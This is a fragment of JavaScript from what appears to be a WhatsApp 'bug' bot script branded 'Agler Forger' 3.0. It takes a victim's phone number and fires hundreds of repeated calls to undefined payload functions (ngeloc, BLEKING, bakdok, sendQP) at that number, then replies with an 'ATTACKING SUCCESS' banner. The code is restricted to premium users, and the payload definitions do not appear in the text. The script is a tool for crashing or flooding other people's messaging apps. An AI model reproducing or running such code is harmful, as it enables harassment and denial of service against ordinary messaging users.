await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(kandi-superOfficiaL, target, " 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 ", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
